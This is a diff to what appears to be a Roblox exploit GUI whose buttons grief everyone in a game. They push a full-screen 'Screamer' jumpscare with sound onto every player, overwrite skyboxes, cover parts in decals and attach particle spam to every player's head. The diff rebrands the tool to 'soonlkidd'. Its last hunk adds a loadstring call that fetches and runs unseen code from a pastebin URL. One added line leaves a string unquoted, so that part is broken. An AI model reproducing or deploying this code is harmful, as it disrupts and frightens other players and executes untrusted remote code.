@@ -684,7 +684,7 @@ local function MWUZP_fake_script() -- TextButton_5.Script
 
 	script.Parent.MouseButton1Click:Connect(function()
 		local m = Instance.new("Hint", game.workspace)
-		m.Text = "TEAM G00BYD0LA0N JOIN TODAY"
+		m.Text = victory by soonlkidd
 	end)
 	
 end
@@ -776,7 +776,7 @@ local function XELEJW_fake_script() -- TextButton_10.Script
 					local newgui = Instance.new("ScreenGui",v.PlayerGui)
 					newgui.Name = "Screamer"
 					local newimage = Instance.new("ImageLabel",newgui)
-					newimage.Image = "http://www.roblox.com/asset/?id=16140695699"
+					newimage.Image = "http://www.roblox.com/asset/?id=132287954677767"
 					newimage.Size = UDim2.new(1,1,1,1)
 					local s = Instance.new("Sound",newgui)
 					s.SoundId = "rbxassetid://9069609200"
@@ -837,7 +837,7 @@ local function OXACFM_fake_script() -- TextButton_13.Script
 			leaderstats.Parent = player
 	
 			local money = Instance.new("IntValue")
-			money.Name = "g00byd0la0n"
+			money.Name = "soonlkidd"
 			money.Value = 0
 			money.Parent = leaderstats
 		end)
@@ -847,7 +847,7 @@ local function OXACFM_fake_script() -- TextButton_13.Script
 			leaderstats.Parent = v
 	
 			local money = Instance.new("IntValue")
-			money.Name = "g00byd0la0n"
+			money.Name = "soonlkidd"
 			money.Value = 0
 			money.Parent = leaderstats
 		end
@@ -861,19 +861,19 @@ local function BUCGR_fake_script() -- TextButton_14.Script
 		local s = Instance.new("Sky")
 		s.Name = "Sky"
 		s.Parent = game.Lighting
-		s.SkyboxBk = "http://www.roblox.com/asset/?id=172423468"
-		s.SkyboxDn = "http://www.roblox.com/asset/?id=172423468"
-		s.SkyboxFt = "http://www.roblox.com/asset/?id=172423468"
-		s.SkyboxLf = "http://www.roblox.com/asset/?id=172423468"
-		s.SkyboxRt = "http://www.roblox.com/asset/?id=172423468"
-		s.SkyboxUp = "http://www.roblox.com/asset/?id=172423468"
+		s.SkyboxBk = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxDn = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxFt = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxLf = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxRt = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxUp = "http://www.roblox.com/asset/?id=111162344979395"
 		s.SunAngularSize = 0
 		s.MoonAngularSize = 0
 		for i = 1, 10 do
 			for i, v in pairs(game:GetService("Players"):GetChildren()) do
 				local emit = Instance.new("ParticleEmitter")
 				emit.Parent = v.Character.Head
-				emit.Texture = "http://www.roblox.com/asset/?id=11664604903"
+				emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 				emit.VelocitySpread = 100000
 				emit.SpreadAngle =  Vector2.new(0, 0)
 				emit.Speed = NumberRange.new(9, 9)
@@ -905,7 +905,7 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 	function click()
 		function exPro(root)
 			for _, v in pairs(root:GetChildren()) do
-				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=12674646478" then
+				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=111162344979395" then
 					v.Parent = nil
 				elseif v:IsA("BasePart") then
 					v.Material = "Plastic"
@@ -916,12 +916,12 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 					local Four = Instance.new("Decal", v)
 					local Five = Instance.new("Decal", v)
 					local Six = Instance.new("Decal", v)
-					One.Texture = "http://www.roblox.com/asset/?id=12674646478"
-					Two.Texture = "http://www.roblox.com/asset/?id=12674646478"
-					Three.Texture = "http://www.roblox.com/asset/?id=12674646478"
-					Four.Texture = "http://www.roblox.com/asset/?id=12674646478"
-					Five.Texture = "http://www.roblox.com/as set/?id=12674646478"
-					Six.Texture = "http://www.roblox.com/asset/?id=12674646478"
+					One.Texture = "http://www.roblox.com/asset/?id=111162344979395"
+					Two.Texture = "http://www.roblox.com/asset/?id=111162344979395"
+					Three.Texture = "http://www.roblox.com/asset/?id=111162344979395"
+					Four.Texture = "http://www.roblox.com/asset/?id=111162344979395"
+					Five.Texture = "http://www.roblox.com/asset/?id=111162344979395"
+					Six.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 					One.Face = "Front"
 					Two.Face = "Back"
 					Three.Face = "Right"
@@ -949,7 +949,7 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)
@@ -957,7 +957,7 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)
@@ -965,7 +965,7 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)
@@ -973,28 +973,28 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)
@@ -1002,119 +1002,119 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)script.Parent.MouseButton1Click:Connect(function()
 		for i, v in pairs(game.Players:GetChildren()) do
 			emit = Instance.new("ParticleEmitter")
 			emit.Parent = v.Character.Head
-			emit.Texture = "http://www.roblox.com/asset/?id=12674646478"
+			emit.Texture = "http://www.roblox.com/asset/?id=111162344979395"
 			emit.VelocitySpread = 100000
 		end
 	end)
@@ -1122,12 +1122,12 @@ local function CMIGN_fake_script() -- TextButton_16.Script
 		s = Instance.new("Sky")
 		s.Name = "Sky"
 		s.Parent = game.Lighting
-		s.SkyboxBk = "http://www.roblox.com/asset/?id=12674646478"
-		s.SkyboxDn = "http://www.roblox.com/asset/?id=12674646478"
-		s.SkyboxFt = "http://www.roblox.com/asset/?id=12674646478"
-		s.SkyboxLf = "http://www.roblox.com/asset/?id=12674646478"
-		s.SkyboxRt = "http://www.roblox.com/asset/?id=12674646478"
-		s.SkyboxUp = "http://www.roblox.com/asset/?id=12674646478"
+		s.SkyboxBk = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxDn = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxFt = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxLf = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxRt = "http://www.roblox.com/asset/?id=111162344979395"
+		s.SkyboxUp = "http://www.roblox.com/asset/?id=111162344979395"
 		game.Lighting.TimeOfDay = 12
 	end
 	
@@ -1172,16 +1172,7 @@ local function BCUFIQU_fake_script() -- TextButton_19.Script
 	local script = Instance.new('Script', TextButton_19)
 
 	function click()
-		s = Instance.new("Sky")
-		s.Name = "Sky"
-		s.Parent = game:GetService("Lighting")
-		s.SkyboxBk = "rbxassetid://9894999986"
-		s.SkyboxDn = "rbxassetid://9894999986"
-		s.SkyboxFt = "rbxassetid://9894999986"
-		s.SkyboxLf = "rbxassetid://9894999986"
-		s.SkyboxRt = "rbxassetid://9894999986"
-		s.SkyboxUp = "rbxassetid://9894999986"
-		game.Lighting.TimeOfDay = 12
+		loadstring(game:HttpGet("https://pastebin.com/raw/nFSpwC02"))() 
 	end
 	
 	script.Parent.MouseButton1Down:connect(click)
